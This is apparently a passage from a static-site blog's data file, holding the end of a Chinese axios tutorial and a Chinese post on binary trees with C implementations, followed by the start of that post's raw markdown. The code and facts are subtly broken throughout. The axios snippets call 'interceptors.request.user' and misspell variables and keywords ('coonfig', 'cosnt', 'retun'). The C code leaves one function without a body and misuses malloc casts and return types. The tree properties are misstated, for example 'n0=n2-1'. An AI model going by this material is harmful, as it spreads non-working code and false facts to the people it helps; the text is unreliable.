class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">config</span>)&#123;<br>    <span class=\"hljs-comment\">//发送请求前做点啥~</span><br>    <span class=\"hljs-keyword\">return</span> config;<br>&#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">error</span>)&#123;<br>    <span class=\"hljs-comment\">//对发送中的错误做点啥~</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">reject</span>(error);<br>&#125;);<br><br><span class=\"hljs-comment\">//添加响应拦截器</span><br>axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">response</span>.<span class=\"hljs-title function_\">user</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <span class=\"hljs-comment\">//2xx范围内的状态码都会触发此函数哦~</span><br>    <span class=\"hljs-comment\">//do something.</span><br>    <span class=\"hljs-keyword\">return</span> response;<br>&#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">error</span>)&#123;<br>    <span class=\"hljs-comment\">//2xx以外的状态码都会触发此函数哦~</span><br>    <span class=\"hljs-comment\">//do something.</span><br>    <span class=\"hljs-keyword\">return</span> error;<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"移除拦截器\"><a href=\"#移除拦截器\" class=\"headerlink\" title=\"移除拦截器\"></a>移除拦截器</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> interceptor=axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">user</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br><br>&#125;);<br>axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">eject</span>(interceptor);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"添加拦截器\"><a href=\"#添加拦截器\" class=\"headerlink\" title=\"添加拦截器\"></a>添加拦截器</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> instance = axios.<span class=\"hljs-title function_\">create</span>();<br>instance.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;<span class=\"hljs-comment\">/*...*/</span>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"5-错误处理\"><a href=\"#5-错误处理\" class=\"headerlink\" title=\"5.错误处理\"></a>5.错误处理</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">error</span>)&#123;<br>    <span class=\"hljs-keyword\">if</span>(error.<span class=\"hljs-property\">response</span>)&#123;<br>        <span class=\"hljs-comment\">//请求成功发出且服务器响应了状态码，但是状态码超出了2xx</span><br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error.<span class=\"hljs-property\">response</span>.<span class=\"hljs-property\">data</span>);<br>    &#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(error.<span class=\"hljs-property\">request</span>)&#123;<br>        <span class=\"hljs-comment\">//请求已经发起成功，但是没有收到响应；</span><br>        <span class=\"hljs-comment\">//error.request是浏览器中XMLHttpRequest的实例；</span><br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error.<span class=\"hljs-property\">request</span>);<br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-comment\">//请求发出时出问题</span><br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;Error:&#x27;</span>,error.<span class=\"hljs-property\">message</span>);<br>    &#125;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error.<span class=\"hljs-property\">coonfig</span>);<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"使用validataStatus配置选项，可以自定义抛出错误HttpCode\"><a href=\"#使用validataStatus配置选项，可以自定义抛出错误HttpCode\" class=\"headerlink\" title=\"使用validataStatus配置选项，可以自定义抛出错误HttpCode;\"></a>使用validataStatus配置选项，可以自定义抛出错误HttpCode;</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">validateStatus</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">status</span>)&#123;<br>        <span class=\"hljs-keyword\">return</span> status&gt;<span class=\"hljs-number\">500</span>;<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"使用-toJSON-可以获取更多关于HTTP错误的信息。\"><a href=\"#使用-toJSON-可以获取更多关于HTTP错误的信息。\" class=\"headerlink\" title=\"使用 toJSON 可以获取更多关于HTTP错误的信息。\"></a>使用 <code>toJSON</code> 可以获取更多关于HTTP错误的信息。</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>)<br>  .<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">error</span>) &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error.<span class=\"hljs-title function_\">toJSON</span>());<br>  &#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"6-取消请求\"><a href=\"#6-取消请求\" class=\"headerlink\" title=\"6.取消请求\"></a>6.取消请求</h4><h5 id=\"fetechAPI-AbortController取消请求\"><a href=\"#fetechAPI-AbortController取消请求\" class=\"headerlink\" title=\"fetechAPI  AbortController取消请求\"></a>fetechAPI  AbortController取消请求</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> comtrollor=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">AbortController</span>();<br><br>axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/foo/bar&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">signal</span>:controller.<span class=\"hljs-property\">singal</span><br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <br>&#125;);<br><br>controllor.<span class=\"hljs-title function_\">abort</span>();<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"CancelToken-deprecated-已弃用\"><a href=\"#CancelToken-deprecated-已弃用\" class=\"headerlink\" title=\"CancelToken deprecated(已弃用)\"></a>CancelToken deprecated(已弃用)</h5><h4 id=\"7-请求体编码\"><a href=\"#7-请求体编码\" class=\"headerlink\" title=\"7.请求体编码\"></a>7.请求体编码</h4><p>默认情况下，axios将js对象序列化为json；</p>\n<p>以<code>application/x-www-form-urlencoded</code>格式发送数据；</p>\n<h5 id=\"浏览器\"><a href=\"#浏览器\" class=\"headerlink\" title=\"浏览器\"></a>浏览器</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> params=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">URLSearchParams</span>();<br>params.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">&#x27;param1&#x27;</span>,<span class=\"hljs-string\">&#x27;value1&#x27;</span>);<br>params.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">&#x27;params2&#x27;</span>,<span class=\"hljs-string\">&#x27;value2&#x27;</span>);<br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;/foo&#x27;</span>,params);<br><br><span class=\"hljs-comment\">//注意，并不是所有的浏览器都支持URLResearchParams</span><br><br><span class=\"hljs-comment\">//qs库编码数据</span><br><span class=\"hljs-keyword\">const</span> qs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;qs&#x27;</span>);<br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;/foo&#x27;</span>,qs.<span class=\"hljs-title function_\">stringify</span>(&#123;<br>    <span class=\"hljs-string\">&#x27;bar&#x27;</span>:<span class=\"hljs-number\">123</span><br>&#125;));<br><br>或者<span class=\"hljs-title class_\">ES6</span>方法<br><br><span class=\"hljs-keyword\">import</span> qs <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;qs&#x27;</span>;<br>cosnt data=&#123;<br>    <span class=\"hljs-string\">&#x27;bar&#x27;</span>:<span class=\"hljs-number\">123</span><br>&#125;;<br><br><span class=\"hljs-keyword\">const</span> options=&#123;<br>    <span class=\"hljs-attr\">method</span>:<span class=\"hljs-string\">&#x27;POST&#x27;</span>,<br>    <span class=\"hljs-attr\">headers</span>:&#123; <span class=\"hljs-string\">&#x27;content-type&#x27;</span>: <span class=\"hljs-string\">&#x27;application/x-www-form-urlencoded&#x27;</span> &#125;,<br>    <span class=\"hljs-attr\">data</span>:qs.<span class=\"hljs-title function_\">stringify</span>(data),<br>    url,<br>&#125;;<br><span class=\"hljs-title function_\">axios</span>(options);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"NodeJS-使用querystring\"><a href=\"#NodeJS-使用querystring\" class=\"headerlink\" title=\"NodeJS 使用querystring\"></a>NodeJS 使用querystring</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-keyword\">const</span> querystring = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;querystring&#x27;</span>);<br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;http://something.com/&#x27;</span>, querystring.<span class=\"hljs-title function_\">stringify</span>(&#123; <span class=\"hljs-attr\">foo</span>: <span class=\"hljs-string\">&#x27;bar&#x27;</span> &#125;));<br><br><span class=\"hljs-keyword\">const</span> url = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;url&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> params = <span class=\"hljs-keyword\">new</span> url.<span class=\"hljs-title class_\">URLSearchParams</span>(&#123; <span class=\"hljs-attr\">foo</span>: <span class=\"hljs-string\">&#x27;bar&#x27;</span> &#125;);<br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;http://something.com/&#x27;</span>, params.<span class=\"hljs-title function_\">toString</span>());<br><br><span class=\"hljs-comment\">//如果需要对嵌套对象进行字符串化处理，则最好使用 qs 库，因为 querystring 方法在该用例中存在已知问题</span><br></code></pre></td></tr></table></figure>\n\n<p>Form Data</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">FormData</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;form-data&#x27;</span>);<br><br><span class=\"hljs-keyword\">const</span> form =<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">FormData</span>();<br>form.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">&#x27;filed1&#x27;</span>,<span class=\"hljs-string\">&#x27;value1&#x27;</span>);<br><br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;https://example.com&#x27;</span>,form,&#123;<span class=\"hljs-attr\">headers</span>:<span class=\"hljs-keyword\">from</span>.<span class=\"hljs-title function_\">getHeaders</span>()&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>拦截器</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">config</span>=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">if</span>(config.<span class=\"hljs-property\">data</span> <span class=\"hljs-keyword\">instanceof</span> <span class=\"hljs-title class_\">FormData</span>)&#123;<br>        <span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">assign</span>(config.<span class=\"hljs-property\">headers</span>,config.<span class=\"hljs-property\">data</span>.<span class=\"hljs-title function_\">getHeaders</span>());<br>    &#125;<br>    retun config;<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"树","date":"2021-08-21T12:57:45.000Z","mp3":null,"cover":"img/bg22.jpg","_content":"# Ch 5 树\n\n## 一、二叉树及其性质\n\n（1）二叉树可以为空，但是二叉有序树至少三个节点；\n\n（2）满二叉树：2^k-1个节点、\n\n（3）非空二叉树第i层的节点数不超过2^i-1个；\n\n（4）深度为k的二叉树最少k个节点，最多2^k-1个节点；\n\n（5）n0=n2-1;\n\n（6）n个节点的二叉树深度为Log2 N-1；\n\n（7）完全二叉树中，节点i的双亲节点为[i/2],左孩子2i，有孩子2i+1；\n\n## 二、二叉树的实现及常用操作\n\n### 1.二叉树的基本操作\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n#define MAXNODE 10\n\ntypedef int Elemtype ;\n\ntypedef struct BiTreeNode\n{\n    Elemtype data;\n    struct BiTreeNode *lchild,*rchild;\n} BiTreeNode,*BiTree;\n\ntypedef struct BiTreeParNode\n{\n    Elemtype data;\n    struct BiTreeParNode *lchild,*rchild,*parent;\n} BiParTreeNode,*BiParTree;\n\nvoid Initiate(BiTree T)\n{\n    if((T=(BiTreeNode*)malloc(sizeof(BiTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return;\n    }\n    T->lchild=NULL;\n    T->rchild=NULL;\n    return;\n}\n\nBiTree CreateTree(Elemtype x)\n{\n    BiTree p;\n    if((p=(BiTree *)malloc(sizeof(BiTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    return p;\n}\n\nBiTree InsertTreeLeftNode(BiTree T,Elemtype x,BiTree parent)\n{\n    BiTree p;\n    if(parent==NULL)\n    {\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    }\n    if((p=(BiTree*)malloc(sizeof(BiTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->lchild==NULL)\n    {\n        parent->lchild=p;\n    }\n    else\n    {\n        p->lchild=parent->lchild;\n        parent->lchild=p;\n    }\n    printf(\"Insert data %d to leftchild.\\n\",x);\n    return T;\n}\n\nBiTree InsertTreeRightNode(BiTree T,Elemtype x,BiTree parent)\n{\n    BiTree p;\n    if(parent==NULL)\n    {\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    }\n    if((p=(BiTree*)malloc(sizeof(BiTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->rchild==NULL)\n    {\n        parent->rchild=p;\n    }\n    else\n    {\n        p->rchild=parent->rchild;\n        parent->rchild=p;\n    }\n    printf(\"Insert data %d to rightchild.\\n\",x);\n    return T;\n}\n\nBiTree DeleteTreeLeftNode(BiTree T,BiTree parent)\n{\n    BiTree p;\n    if(parent==NULL||parent->lchild==NULL)\n    {\n        printf(\"No left child.\\n\");\n        return NULL;\n    }\n    p=parent->lchild;\n    parent->lchild=NULL;\n    free(p);\n    return T;\n}\n\nBiTree DeleteTreeRightNode(BiTree T,BiTree parent)\n{\n    BiTree p;\n    if(parent==NULL||parent->rchild==NULL)\n    {\n        printf(\"No left child.\\n\");\n        return NULL;\n    }\n    p=parent->rchild;\n    parent->rchild=NULL;\n    free(p);\n    return T;\n}\n\nint PreOrderTree(BiTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    Visit(T->data);\n    PreOrderTree(T->lchild);\n    PreOrderTree(T->rchild);\n\n}\n\nint MiddleOrderTree(BiTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    MiddleOrderTree(T->lchild);\n    Visit(T->data);\n    MiddleOrderTree(T->rchild);\n\n}\n\nint LastOrderTree(BiTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    LastOrderTree(T->lchild);\n    LastOrderTree(T->rchild);\n    Visit(T->data);\n\n}\n\nvoid LevelOrderTree(BiTree T)\n{\n    BiTree Queue[MAXNODE];\n    int front,rear;\n\n    if(T==NULL)\n    {\n        return;\n    }\n    front=-1;\n    rear=-1;\n    Queue[++rear]=T;\n    while(front!=rear)\n    {\n        Visit(Queue[++front]->data);\n        if(Queue[front]->lchild!=NULL)\n        {\n            Queue[++rear]=Queue[front]->lchild;\n        }\n        if(Queue[front]->rchild!=NULL)\n        {\n            Queue[++rear]=Queue[front]->rchild;\n        }\n    }\n}\n\nvoid Visit(Elemtype data)\n{\n    printf(\"%3d\",data);\n}\n\n\nint main()\n{\n    BiTree myTree;\n    Elemtype rootData;\n    int numberOfNodes,index,choice;\n\n    printf(\"Please enter the node number:\\n\");\n    scanf(\"%d\",&numberOfNodes);\n    printf(\"Please enter the data of root node:\");\n    scanf(\"%d\",&rootData);\n\n    myTree=CreateTree(rootData);\n\n    for(index=1; index<numberOfNodes; index++)\n    {\n        printf(\"No %d node's position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root's leftchild.\\n4.Rightchild of the Root's leftchild.\\n5.Leftchild of the Root's rightchild.\\n6.Rightchild of the Root's rightchild.\\n\",index);\n        printf(\"Choice:\");\n        scanf(\"%d\",&choice);\n        printf(\"Please enter the %d data:\",index);\n        Elemtype nodedata;\n        scanf(\"%d\",&nodedata);\n        switch(choice)\n        {\n        case 1:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);\n            break;\n        case 2:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree);\n            break;\n        case 3:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 4:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 5:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->rchild);\n            break;\n        case 6:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->rchild);\n            break;\n        }\n    }\n    printf(\"Preorder:\");\n    PreOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Middleorder:\");\n    MiddleOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Postorder:\");\n    LastOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Leverorder:\");\n    LevelOrderTree(myTree);\n    printf(\"\\n\");\n\n    return 0;\n}\n\n\n\n\n```\n\n### 2.线索二叉树的基本操作\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n#define MAXNODE 10\n\ntypedef int Elemtype ;\n\ntypedef struct BiThrTreeNode\n{\n    Elemtype data;\n    struct BiThrTreeNode *lchild;\n    struct BiThrTreeNode *rchild;\n    unsigned ltag:1;\n    unsigned rtag:1;\n} BiThrTreeNode,*BiThrTree;\n\nBiThrTree pre;\n\n\nvoid Visit(Elemtype data)\n{\n    printf(\"%3d\",data);\n}\n\n\nBiThrTree CreateTree(Elemtype x)\n{\n    BiThrTree p;\n    if((p=(BiThrTree *)malloc(sizeof(BiThrTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    return p;\n}\n\nBiThrTree InsertTreeLeftNode(BiThrTree T,Elemtype x,BiThrTree parent)\n{\n    BiThrTree p;\n    if(parent==NULL)\n    {\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    }\n    if((p=(BiThrTree*)malloc(sizeof(BiThrTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->lchild==NULL)\n    {\n        parent->lchild=p;\n        parent->ltag=0;\n    }\n    else\n    {\n        p->lchild=parent->lchild;\n        parent->lchild=p;\n        parent->ltag=0;\n    }\n    printf(\"Insert data %d to leftchild.\\n\",x);\n    return T;\n}\n\nBiThrTree InsertTreeRightNode(BiThrTree T,Elemtype x,BiThrTree parent)\n{\n    BiThrTree p;\n    if(parent==NULL)\n    {\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    }\n    if((p=(BiThrTree*)malloc(sizeof(BiThrTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->rchild==NULL)\n    {\n        parent->rchild=p;\n        parent->rtag=0;\n    }\n    else\n    {\n        p->rchild=parent->rchild;\n        parent->rchild=p;\n        parent->rtag=0;\n    }\n    printf(\"Insert data %d to rightchild.\\n\",x);\n    return T;\n}\n\n\nint MiddleOrderTree(BiThrTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    MiddleOrderTree(T->lchild);\n    Visit(T->data);\n    MiddleOrderTree(T->rchild);\n\n}\n\nBiThrTree MiddleOrderThr(BiThrTree T)\n\nBiThrTree DeleteTreeLeftNode(BiThrTree T,BiThrTree parent)\n{\n    BiThrTree p;\n    if(parent==NULL||parent->lchild==NULL)\n    {\n        printf(\"No left child.\\n\");\n        return NULL;\n    }\n    p=parent->lchild;\n    parent->lchild=NULL;\n    free(p);\n    return T;\n}\n\nBiThrTree DeleteTreeRightNode(BiThrTree T,BiThrTree parent)\n{\n    BiThrTree p;\n    if(parent==NULL||parent->rchild==NULL)\n    {\n        printf(\"No left child.\\n\");\n        return NULL;\n    }\n    p=parent->rchild;\n    parent->rchild=NULL;\n    free(p);\n    return T;\n}\n\nint PreOrderTree(BiThrTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    Visit(T->data);\n    PreOrderTree(T->lchild);\n    PreOrderTree(T->rchild);\n\n}\n\n\n\nint LastOrderTree(BiThrTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    LastOrderTree(T->lchild);\n    LastOrderTree(T->rchild);\n    Visit(T->data);\n\n}\n\nvoid LevelOrderTree(BiThrTree T)\n{\n    BiThrTree Queue[MAXNODE];\n    int front,rear;\n\n    if(T==NULL)\n    {\n        return;\n    }\n    front=-1;\n    rear=-1;\n    Queue[++rear]=T;\n    while(front!=rear)\n    {\n        Visit(Queue[++front]->data);\n        if(Queue[front]->lchild!=NULL)\n        {\n            Queue[++rear]=Queue[front]->lchild;\n        }\n        if(Queue[front]->rchild!=NULL)\n        {\n            Queue[++rear]=Queue[front]->rchild;\n        }\n    }\n}\n\n\n\nint main()\n{\n    BiThrTree myTree;\n    Elemtype rootData;\n    int numberOfNodes,index,choice;\n\n    printf(\"Please enter the node number:\\n\");\n    scanf(\"%d\",&numberOfNodes);\n    printf(\"Please enter the data of root node:\");\n    scanf(\"%d\",&rootData);\n\n    myTree=CreateTree(rootData);\n\n    for(index=1; index<numberOfNodes; index++)\n    {\n        printf(\"No %d node's position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root's leftchild.\\n4.Rightchild of the Root's leftchild.\\n5.Leftchild of the Root's rightchild.\\n6.Rightchild of the Root's rightchild.\\n\",index);\n        printf(\"Choice:\");\n        scanf(\"%d\",&choice);\n        printf(\"Please enter the %d data:\",index);\n        Elemtype nodedata;\n        scanf(\"%d\",&nodedata);\n        switch(choice)\n        {\n        case 1:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);\n            break;\n        case 2:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree);\n            break;\n        case 3:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 4:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 5:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->rchild);\n            break;\n        case 6:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->rchild);\n            break;\n        }\n    }\n    printf(\"Preorder:\");\n    PreOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Middleorder:\");\n    MiddleOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Postorder:\");\n    LastOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Leverorder:\");\n    LevelOrderTree(myTree);\n    printf(\"\\n\");\n\n    return 0;\n}\n\n\n\n\n```\n\n### 3.哈夫曼树\n\n","source":"_posts/Ch5 树.md","raw":"---\ntitle: 树\ndate: 2021-08-21 20:57:45\ncategories: \n    - 编程\ntags: \n    - C语言\nmp3: \ncover: img/bg22.jpg\n---\n# Ch 5 树\n\n## 一、二叉树及其性质\n\n（1）二叉树可以为空，但是二叉有序树至少三个节点；\n\n（2）满二叉树：2^k-1个节点、\n\n（3）非空二叉树第i层的节点数不超过2^i-1个；\n\n（4）深度为k的二叉树最少k个节点，最多2^k-1个节点；\n\n（5）n0=n2-1;\n\n（6）n个节点的二叉树深度为Log2 N-1；\n\n（7）完全二叉树中，节点i的双亲节点为[i/2],左孩子2i，有孩子2i+1；\n\n## 二、二叉树的实现及常用操作\n\n### 1.二叉树的基本操作\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n#define MAXNODE 10\n\ntypedef int Elemtype ;\n\ntypedef struct BiTreeNode\n{\n    Elemtype data;\n    struct BiTreeNode *lchild,*rchild;\n} BiTreeNode,*BiTree;\n\ntypedef struct BiTreeParNode\n{\n    Elemtype data;\n    struct BiTreeParNode *lchild,*rchild,*parent;\n} BiParTreeNode,*BiParTree;\n\nvoid Initiate(BiTree T)\n{\n    if((T=(BiTreeNode*)malloc(sizeof(BiTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return;\n    }\n    T->lchild=NULL;\n    T->rchild=NULL;\n    return;\n}\n\nBiTree CreateTree(Elemtype x)\n{\n    BiTree p;\n    if((p=(BiTree *)malloc(sizeof(BiTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    return p;\n}\n\nBiTree InsertTreeLeftNode(BiTree T,Elemtype x,BiTree parent)\n{\n    BiTree p;\n    if(parent==NULL)\n    {\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    }\n    